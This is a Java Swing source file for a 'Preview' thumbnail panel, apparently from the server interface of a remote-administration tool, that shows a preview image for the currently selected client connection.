package subterranean.crimson.server.graphics.dmodules;

import java.awt.BorderLayout;
import java.awt.Color;

import javax.swing.JLabel;
import javax.swing.border.LineBorder;
import javax.swing.border.TitledBorder;

import subterranean.crimson.server.containers.ConnectionProfile;
import subterranean.crimson.server.graphics.DModule;
import subterranean.crimson.server.graphics.panels.mainscreen.Main;
import subterranean.crimson.server.network.Connection;
import subterranean.crimson.universal.StreamStore;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.streams.previewstream.PreviewStream;

public class Thumbnail extends DModule {

	private static final long serialVersionUID = 1L;
	ConnectionProfile cp;
	private JLabel image;
	private int streamID;

	public Thumbnail() {
		setBorder(new TitledBorder(new LineBorder(new Color(184, 207, 229)), "Preview", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		setLayout(new BorderLayout(0, 0));

		image = new JLabel("");
		add(image);

		if (cp != null) {
			updateGraphics();
		}
	}

	public void updateGraphics() {
		image.setIcon(cp.info.getPreview());
		Main.mainPane.repaint();
		Main.mainPane.validate();
	}

	@Override
	public void changeTarget(Connection c) {
		if (c != null) {
			this.cp = c.getProfile();
			StreamStore.removeStream(streamID);
//			PreviewStream ps = new PreviewStream(700, true, Utilities.getDetailWidth(), c);
//			streamID = ps.getStreamID();
			updateGraphics();
		} else {
			StreamStore.removeStream(streamID);
		}
	}

	@Override
	public int compareTo(Object o) {
		return (weight - ((DModule) o).weight);
	}

}
